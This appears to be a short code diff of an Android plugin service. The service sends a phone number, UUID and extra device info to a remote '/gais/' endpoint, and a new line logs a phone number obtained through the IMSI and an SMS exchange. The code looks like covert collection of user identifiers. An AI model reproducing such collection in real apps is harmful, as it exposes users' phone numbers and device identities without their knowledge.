@@ -8,6 +8,7 @@ import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
 import android.text.TextUtils;
+import com.bwx.bequick.fwk.Setting;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
 import com.xstd.plugin.Utils.BRCUtil;
@@ -18,6 +19,7 @@ import com.xstd.plugin.api.*;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
+import com.xstd.qm.Utils;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -144,7 +146,7 @@ public class PluginService extends IntentService {
                                                                  , phone
                                                                  , uuid
                                                                  , domain + "/gais/"
-                                                                 , SettingManager.getInstance().getMainExtraInfo());
+                                                                 , com.xstd.qm.setting.SettingManager.getInstance().getExtraInfo());
             MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
             if (response != null && !TextUtils.isEmpty(response.url)) {
@@ -182,6 +184,7 @@ public class PluginService extends IntentService {
                         }
                         if (respone.phone.length() == 11) {
                             SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                            Utils.saveExtraInfo("子程序通过IMSI获取到手机:" + respone.phone);
                         } else {
                             SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
                             //如果获取失败了，就再明天再向短信服务器发送短信.
